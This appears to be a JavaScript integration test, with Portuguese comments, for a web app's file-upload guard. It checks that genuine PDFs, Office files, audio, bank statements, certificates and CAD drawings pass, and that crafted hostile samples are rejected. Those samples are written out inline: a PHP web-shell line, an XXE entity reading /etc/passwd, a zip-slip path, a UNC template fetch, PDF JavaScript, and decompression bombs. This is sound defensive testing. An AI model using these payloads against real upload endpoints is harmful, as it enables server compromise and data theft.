'use strict';
// Guarda de arquivos — TODOS os tipos de documento (PDF, áudio, Office, texto/OFX, certificado, CAD), pelas rotas reais, com arquivos de verdade
// gerados pelo Chromium (JPEG/PNG/WebP, voz em WebM, PDF) e pelo pdf-lib (PDF com objetos comprimidos) além dos montados à mão (fixtures-guarda.js).
const { req, ok, ca, run, wait, D, B } = require('./lib');
const F = require('./fixtures-guarda');
const puppeteer = require('/app/node_modules/puppeteer-core');

const send = async (path, parts, extra = {}, method = 'POST') => {
  const fd = new FormData(); for (const [field, name, buf, type] of parts) fd.append(field, new Blob([buf], { type }), name);
  for (const [k, v] of Object.entries(extra)) fd.append(k, v);
  const r = await fetch(B + path, { method, headers: { cookie: ca }, body: fd }); let j = null; try { j = await r.json(); } catch {}
  return { s: r.status, j, err: (j && j.error) || '' };
};
const raw = async (path, buf, method = 'POST') => { const r = await fetch(B + path, { method, headers: { cookie: ca, 'content-type': 'application/octet-stream' }, body: buf }); let j = null; try { j = await r.json(); } catch {} return { s: r.status, j, err: (j && j.error) || '' }; };

run(async () => {
  const kbId = (await req(ca, 'POST', '/api/kb', { title: 'Guarda de documentos ' + Date.now() % 1e6, solution: 'teste' })).j;
  let KB = `/api/kb/${kbId.id}/files`;
  const kb = (name, buf, type = 'application/octet-stream') => send(KB, [['files', name, buf, type]]);
  const good = async (nome, name, buf, type) => { const r = await kb(name, buf, type); ok(r.s === 200, `ACEITO: ${nome} (${r.s}${r.err ? ' ' + r.err.slice(0, 120) : ''})`); return r; };
  const evil = async (nome, name, buf, type, quer) => { const r = await kb(name, buf, type); ok(r.s === 422 && r.j && r.j.rejected && (!quer || quer.test(r.err)), `RECUSADO: ${nome} — ${r.err.slice(0, 120) || r.s}`); };

  // ================= arquivos de VERDADE (Chromium + pdf-lib) =================
  const br = await puppeteer.launch({ executablePath: '/usr/bin/chromium', headless: true, args: ['--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage', '--use-fake-device-for-media-stream', '--use-fake-ui-for-media-stream', '--autoplay-policy=no-user-gesture-required'] });
  const pg = await br.newPage(); await pg.setCookie({ name: 'sid', value: ca.slice(4), url: B }); await pg.goto(B + '/', { waitUntil: 'networkidle0' });
  const real = await pg.evaluate(async () => {
    const c = document.createElement('canvas'); c.width = 64; c.height = 48; const x = c.getContext('2d'); const g = x.createLinearGradient(0, 0, 64, 48); g.addColorStop(0, '#f80'); g.addColorStop(1, '#08f'); x.fillStyle = g; x.fillRect(0, 0, 64, 48); x.fillStyle = '#fff'; x.fillText('Guarda', 5, 25);
    const b64 = async b => { const a = new Uint8Array(await b.arrayBuffer()); let s = ''; for (const v of a) s += String.fromCharCode(v); return btoa(s); };
    const toB = t => new Promise(r => c.toBlob(r, t, 0.9)); const out = { jpeg: await b64(await toB('image/jpeg')), png: await b64(await toB('image/png')), webp: await b64(await toB('image/webp')) };
    try {
      const st = await navigator.mediaDevices.getUserMedia({ audio: true }), rec = new MediaRecorder(st), parts = []; rec.ondataavailable = e => parts.push(e.data);
      const done = new Promise(r => (rec.onstop = r)); rec.start(); await new Promise(r => setTimeout(r, 1600)); rec.stop(); await done; out.audio = await b64(new Blob(parts, { type: rec.mimeType })); out.audioType = rec.mimeType;
    } catch (e) { out.audioErr = String(e); }
    return out;
  });
  const pdfChrome = Buffer.from(await pg.pdf({ format: 'A4' }));
  await pg.setContent(`<img src="data:image/jpeg;base64,${real.jpeg}" width=300><img src="data:image/png;base64,${real.png}" width=200>`); await wait(300);
  const pdfComFoto = Buffer.from(await pg.pdf({ format: 'A4' })); await br.close();
  const { PDFDocument } = require('/app/node_modules/pdf-lib');
  const pl = await PDFDocument.create(); pl.addPage([200, 200]).drawText('pdf-lib com objetos comprimidos'); const pdfLib = Buffer.from(await pl.save({ useObjectStreams: true }));
  const bin = k => Buffer.from(real[k], 'base64');

  const c = (await req(ca, 'POST', '/api/clients', { name: 'Cliente Docs ' + Date.now() % 1e6 })).j, it = (await req(ca, 'POST', '/api/items', { client_id: c.id, name: 'Item docs' })).j;
  const P = `/api/items/${it.id}/location-photos`;
  let r = await send(P, [['files', 'real.jpg', bin('jpeg'), 'image/jpeg'], ['files', 'real.png', bin('png'), 'image/png'], ['files', 'real.webp', bin('webp'), 'image/webp']]);
  ok(r.s === 200, 'fotos GERADAS PELO CHROMIUM (JPEG, PNG e WebP de verdade) passam pela guarda (' + r.s + ' ' + r.err.slice(0, 100) + ')');
  if (real.audio) {
    r = await send(`/api/items/${it.id}/notes`, [['files', 'nota-de-voz.webm', bin('audio'), real.audioType.split(';')[0] || 'audio/webm']], { text: 'nota de voz' });
    ok(r.s === 200, `nota de voz GRAVADA PELO NAVEGADOR (${real.audioType}, ${bin('audio').length} bytes) passa pela guarda (${r.s} ${r.err.slice(0, 120)})`);
  } else ok(true, 'AVISO: o Chromium do teste não gravou áudio (' + real.audioErr + '): gravação real não testada neste ambiente');
  await good('PDF gerado pelo Chromium', 'chromium.pdf', pdfChrome, 'application/pdf');
  await good('PDF do Chromium COM FOTO JPEG e PNG dentro (imagens conferidas)', 'comfoto.pdf', pdfComFoto, 'application/pdf');
  await good('PDF do pdf-lib (com objetos comprimidos)', 'pdflib.pdf', pdfLib, 'application/pdf');

  // ================= todos os tipos, montados à mão =================
  await good('PDF simples', 'a.pdf', F.PDF(), 'application/pdf');
  await good('Word (docx)', 'a.docx', F.DOCX(), 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
  await good('LibreOffice (odt)', 'a.odt', F.ODT(), 'application/vnd.oasis.opendocument.text');
  await good('Word/Excel antigo (OLE)', 'a.xls', F.OLE(), 'application/vnd.ms-excel');
  await good('RTF', 'a.rtf', F.RTF(), 'application/rtf'); await good('CSV com acentos', 'a.csv', F.CSV, 'text/csv'); await good('CSV marcado como Excel (Windows)', 'b.csv', F.CSV, 'application/vnd.ms-excel');
  await good('áudio WAV', 'a.wav', F.WAV(), 'audio/wav'); await good('áudio MP3 com etiqueta', 'a.mp3', Buffer.concat([F.id3('TIT2 Música'), F.MP3()]), 'audio/mpeg'); await good('áudio OGG/Opus', 'a.ogg', F.OGG(), 'audio/ogg');
  await good('áudio WebM', 'a.webm', F.WEBM(), 'audio/webm'); await good('áudio M4A (MP4)', 'a.m4a', F.MP4(), 'audio/mp4'); await good('áudio 3GP rotulado audio/3gpp', 'a.3gp', F.MP4(), 'audio/3gpp'); await good('áudio FLAC', 'a.flac', F.FLAC(), 'audio/flac'); await good('áudio AMR', 'a.amr', F.AMR(), 'audio/amr'); await good('áudio AAC', 'a.aac', F.AAC(), 'audio/aac');
  await good('áudio com tipo genérico (octet-stream)', 'a2.mp3', F.MP3(), 'application/octet-stream');

  await evil('PDF com JavaScript', 'js.pdf', F.PDF('/OpenAction << /S /JavaScript /JS (app.alert(1)) >>'), 'application/pdf', /JavaScript/);
  await evil('PDF com JavaScript em objeto comprimido', 'objstm.pdf', F.pdfObjStm('<< /S /JavaScript /JS (this.exportDataObject()) >>'), 'application/pdf', /comprimidos/);
  await evil('PDF com arquivo embutido (EXE)', 'embutido.pdf', F.PDF('/Names << /EmbeddedFiles << /Names [(a.exe) 9 0 R] >> >>'), 'application/pdf', /embutido/);
  await evil('PDF com dados depois do %%EOF', 'trailer.pdf', Buffer.concat([F.PDF(), Buffer.from('MZ\x90\0 This program cannot be run in DOS mode')]), 'application/pdf', /depois do fim/);
  await evil('PDF disfarçado: é EXE', 'falso.pdf', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(400, 1)]), 'application/pdf', /diz ser pdf|conteúdo/i);
  await evil('Word com macro', 'macro.docm', F.DOCX([['word/vbaProject.bin', 'x']]), 'application/vnd.ms-word.document.macroEnabled.12', /macro/);
  await evil('Word com programa dentro', 'prog.docx', F.DOCX([['word/helper.exe', 'MZ']]), 'application/octet-stream', /programa/);
  await evil('Word que busca modelo na rede (NTLM/UNC)', 'rede.docx', F.DOCX([], '<Relationship Id="r9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///\\\\10.0.0.9\\x.dotm" TargetMode="External"/>'), 'application/octet-stream', /de fora/);
  await evil('Word com dados escondidos no fim', 'fim.docx', Buffer.concat([F.DOCX(), Buffer.from('<?php system($_GET[1]); ?>')]), 'application/octet-stream', /depois do fim/);
  await evil('Word com caminho ../ (zip slip)', 'slip.docx', F.DOCX([['../../etc/cron.d/x', 'x']]), 'application/octet-stream', /caminho/);
  await evil('bomba de descompressão em ZIP', 'bomba.docx', F.zip([['[Content_Types].xml', '<Types/>'], ['x.xml', Buffer.alloc(250 * 1024 * 1024)]]), 'application/octet-stream', /exagerada|grande/);
  await evil('Excel antigo com macro (VBA)', 'macro.xls', F.OLE(['Workbook', 'VBA']), 'application/vnd.ms-excel', /macro/);
  await evil('Word antigo com objeto embutido', 'obj.doc', F.OLE(['WordDocument', '\x01Ole10Native']), 'application/msword', /objeto|macro/);
  await evil('RTF com objeto embutido (exploit clássico)', 'obj.rtf', F.RTF('{\\object{\\*\\objdata 01050000}}'), 'application/rtf', /objeto/);
  await evil('arquivo ZIP qualquer', 'x.zip', F.zip([['a.txt', 'oi']]), 'application/zip', /não é aceito/);
  await evil('EXE com nome .txt', 'x.txt', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(400, 1)]), 'text/plain', /controle|binário/);
  await evil('CSV com código PHP', 'x.csv', Buffer.from('a;b\n<?php system($_GET[1]); ?>;2\n'), 'text/csv', /PHP/);
  await evil('áudio WAV com script na etiqueta', 'x.wav', F.WAV(F.wavList('<script>alert(1)</script>')), 'audio/wav', /script/);
  await evil('áudio MP3 com lixo no fim', 'x.mp3', Buffer.concat([F.MP3(), Buffer.from('PK\x03\x04conteudo escondido aqui')]), 'audio/mpeg', /áudio|escondidos/);
  await evil('áudio OGG com dados no fim', 'x.ogg', Buffer.concat([F.OGG(), Buffer.from('MZ\x90\0\x03\0\0\0')]), 'audio/ogg', /OGG/);
  await evil('áudio WebM com arquivo embutido', 'x.webm', F.WEBM(F.eb(0x1941a469, Buffer.from('x'))), 'audio/webm', /embutidos/);
  await evil('áudio M4A com dados no fim', 'x.m4a', Buffer.concat([F.MP4(), Buffer.from('<?php x ?>')]), 'audio/mp4', /MP4/);
  await evil('"áudio" que na verdade é PDF', 'x.mp3', F.PDF(), 'audio/mpeg', /não bate|conteúdo/);
  await evil('"áudio" que na verdade é HTML', 'x.ogg', Buffer.from('<html><script>alert(1)</script></html>'), 'audio/ogg', /conteúdo|não bate/);

  // ================= rotas que só aceitam foto/áudio =================
  r = await send(`/api/items/${it.id}/notes`, [['files', 'a.mp3', Buffer.from('MZ' + 'x'.repeat(300)), 'audio/mpeg']], { text: 'x' });
  ok(r.s === 422, 'nota de voz que não é áudio (EXE com nome .mp3) é RECUSADA (' + r.s + ')');
  r = await send(P, [['files', 'a.jpg', F.PDF(), 'image/jpeg']]); ok(r.s === 422, 'PDF disfarçado de foto é RECUSADO (' + r.s + ')');

  // ================= extrato bancário (OFX 1.x, OFX 2.x em XML, CSV) =================
  const acc = (await req(ca, 'POST', '/api/finance/bank/accounts', { name: 'Conta Guarda ' + Date.now() % 1e6 })).j;
  const imp = (name, buf, type = 'text/plain') => send('/api/finance/bank/import', [['file', name, buf, type]], { account: acc.name || 'Cora' });
  r = await imp('extrato.ofx', F.OFX1); ok(r.s === 200, 'extrato OFX 1.x (SGML) é aceito (' + r.s + ' ' + r.err.slice(0, 80) + ')');
  r = await imp('extrato2.ofx', F.OFX2, 'application/x-ofx'); ok(r.s === 200 || (r.s === 400 && !/segurança/.test(r.err)), 'extrato OFX 2.x (XML) passa pela guarda (' + r.s + ' ' + r.err.slice(0, 80) + ')');
  r = await imp('extrato.csv', F.CSV, 'text/csv'); ok(r.s !== 422, 'extrato CSV passa pela guarda (' + r.s + ')');
  r = await imp('extrato.ofx', Buffer.from('OFXHEADER:100\n<OFX><?php system($_GET[1]); ?></OFX>')); ok(r.s === 422 && /PHP/.test(r.err), 'extrato com código PHP é RECUSADO: ' + r.err.slice(0, 90));
  r = await imp('extrato.ofx', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(300, 1)])); ok(r.s === 422, 'extrato que é programa é RECUSADO');
  r = await imp('extrato.ofx', Buffer.from('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><OFX>&e;</OFX>'), 'text/xml'); ok(r.s === 422 && /DOCTYPE/.test(r.err), 'extrato XML com XXE é RECUSADO');

  // ================= certificado digital (PFX/PEM/CER) =================
  const PW = require('crypto').randomBytes(8).toString('hex'), cert = F.certs(PW);
  for (const [rota, campo] of [['/api/fiscal/certificate', 'file'], ['/api/signcert', 'file']]) {
    r = await send(rota, [[campo, 'cert.pfx', cert.pfx, 'application/x-pkcs12']], { password: 'errada-' + PW });
    ok(r.s !== 422 && !/segurança/.test(r.err), `${rota}: certificado com estrutura certa passa pela guarda e segue para a conferência da senha (${r.s} ${r.err.slice(0, 70)})`);
    r = await send(rota, [[campo, 'cert.pfx', Buffer.concat([cert.pfx, Buffer.from('MZ evil payload')]), 'application/x-pkcs12']], { password: PW });
    ok(r.s === 422 && /recusado por segurança/.test(r.err), `${rota}: certificado com bytes escondidos no fim é RECUSADO (${r.s})`);
    r = await send(rota, [[campo, 'cert.pfx', Buffer.from('isto não é certificado nenhum, é só texto qualquer com mais de trinta bytes'), 'application/x-pkcs12']], { password: PW });
    ok(r.s === 422, `${rota}: arquivo qualquer no lugar do certificado é RECUSADO (${r.s})`);
    r = await send(rota, [[campo, 'cert.pdf', F.PDF(), 'application/pdf']], { password: PW }); ok(r.s === 422, `${rota}: PDF no lugar do certificado é RECUSADO`);
  }

  // ================= desenho CAD (DXF/DWG) =================
  r = await raw('/api/cad/drawings?name=guarda.dxf', F.DXF); ok(r.s === 200, 'DXF válido é aceito no Desenho CAD (' + r.s + ' ' + r.err.slice(0, 80) + ')');
  r = await raw('/api/cad/drawings?name=guarda.dwg', F.DWG); ok(r.s === 200, 'DWG válido é aceito no Desenho CAD (' + r.s + ')');
  r = await raw('/api/cad/drawings?name=mau.dxf', Buffer.from(F.DXF.toString().replace('LINE', '<?php system(1) ?>'))); ok(r.s === 400 && /recusado por segurança/.test(r.err), 'DXF com código escondido é RECUSADO: ' + r.err.slice(0, 80));
  r = await raw('/api/cad/drawings?name=mau.dwg', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(300, 1)])); ok(r.s === 400, 'EXE com nome .dwg é RECUSADO');

  KB = `/api/kb/${(await req(ca, 'POST', '/api/kb', { title: 'Guarda 2 ' + Date.now() % 1e6, solution: 'teste' })).j.id}/files`; // outro artigo (cada um aceita até 20 arquivos)
  // ================= limites fechados (imagens em PDF, áudio sem vídeo, macros antigas, foto em movimento, rede) =================
  await evil('PDF com imagem JBIG2', 'jbig2.pdf', F.pdfImg('/Filter /JBIG2Decode', Buffer.from('xx')), 'application/pdf', /JBIG2/);
  await evil('PDF com imagem JPEG2000', 'jpx.pdf', F.pdfImg('/Filter /JPXDecode', Buffer.from('xx')), 'application/pdf', /JPEG2000/);
  await evil('PDF com JPEG que esconde programa no fim', 'dct.pdf', F.pdfImg('/Filter /DCTDecode', Buffer.concat([F.JPG, Buffer.from('MZ\x90\0 This program cannot be run in DOS mode')])), 'application/pdf', /JPEG dentro do PDF/);
  await evil('PDF com imagem que explode ao descomprimir', 'bomba.pdf', F.pdfImg('/Filter /FlateDecode', require('zlib').deflateSync(Buffer.alloc(100 * 1024 * 1024))), 'application/pdf', /bomba/);
  await good('PDF com imagem JPEG de verdade (conferida)', 'imagem.pdf', F.pdfImg('/Filter /DCTDecode', F.JPG), 'application/pdf');
  await evil('Excel antigo com folha de macro (Excel 4/XLM)', 'xlm.xls', F.XLS({ macro: true }), 'application/vnd.ms-excel', /macro/);
  await evil('Excel antigo com folha de macro (planilha pequena)', 'xlm2.xls', F.XLS({ macro: true, mini: true }), 'application/vnd.ms-excel', /macro/);
  await good('Excel antigo comum (planilha grande e pequena)', 'ok.xls', F.XLS(), 'application/vnd.ms-excel'); await good('Excel antigo pequeno', 'ok2.xls', F.XLS({ mini: true }), 'application/vnd.ms-excel');
  await evil('Excel moderno com folha de macro', 'xlm.xlsx', F.DOCX([['xl/macrosheets/sheet1.xml', '<x/>']]), 'application/octet-stream', /macro/);
  await evil('"áudio" M4A com faixa de VÍDEO', 'video.m4a', F.MP4(Buffer.alloc(0), 'vide'), 'audio/mp4', /vídeo/);
  await evil('"áudio" WebM com faixa de VÍDEO', 'video.webm', F.WEBM(Buffer.alloc(0), true, 1), 'audio/webm', /vídeo/);
  await evil('FLAC com dados escondidos depois do último quadro', 'x.flac', Buffer.concat([F.FLAC(), Buffer.from('MZ evil payload data')]), 'audio/flac', /FLAC/);
  await evil('MP3 com último quadro cortado/escondido', 'x2.mp3', F.MP3().subarray(0, 1000), 'audio/mpeg', /incompleto/);
  r = await send(P, [['files', 'motion.jpg', F.motion({ sef: true }), 'image/jpeg']]);
  ok(r.s === 200, 'FOTO EM MOVIMENTO (Samsung/Google: JPEG + vídeo MP4 + bloco SEF) é aceita (' + r.s + ' ' + r.err.slice(0, 80) + ')');
  const mf = D.prepare("SELECT filename FROM attachments WHERE item_id = ? AND kind = 'location' ORDER BY id DESC LIMIT 1").get(it.id).filename;
  const mb = Buffer.from(await (await fetch(B + '/files/' + mf, { headers: { cookie: ca } })).arrayBuffer());
  ok(mb.length < F.motion({ sef: true }).length - 100 && !mb.includes('SEFT') && !mb.includes(Buffer.from('ftyp')) && mb.subarray(-2).equals(Buffer.from([0xff, 0xd9])), 'da foto em movimento só fica a FOTO (o vídeo e o bloco SEF são descartados): ' + mb.length + ' bytes');
  r = await send(P, [['files', 'motion-mau.jpg', F.motion({ mp4: F.MP4(F.box('udta', Buffer.from('<script>alert(1)</script>')), 'vide') }), 'image/jpeg']]);
  ok(r.s === 422 && /script/.test(r.err), 'foto em movimento com script escondido no vídeo é RECUSADA: ' + r.err.slice(0, 80));
  r = await send(P, [['files', 'jpeg-php.jpg', Buffer.concat([F.JPG, Buffer.from('<?php system($_GET[1]); ?>')]), 'image/jpeg']]); ok(r.s === 422, 'JPEG com PHP colado no fim continua RECUSADO');
  const sf2 = (await req(ca, 'POST', '/api/uploadguard/selftest', {})).j;
  ok(sf2.ok === true && sf2.rede === true && sf2.rede_http === true && sf2.dns === true && sf2.eval === true && sf2.sem_atalhos === true, 'o verificador não tem rede (TCP, HTTP, DNS), eval nem atalhos internos: ' + JSON.stringify(sf2));

  // ================= registro das recusas e sistema de pé =================
  const rj = (await req(ca, 'GET', '/api/uploadguard')).j;
  ok(rj.recent.length >= 20 && rj.recent.every(x => x.reason && x.sha256.length === 64), 'as recusas ficaram registradas com motivo e impressão digital (' + rj.recent.length + ' nas últimas 100)');
  ok((await fetch(B + '/', { headers: { cookie: ca } })).status === 200, 'o sistema continua respondendo');
});
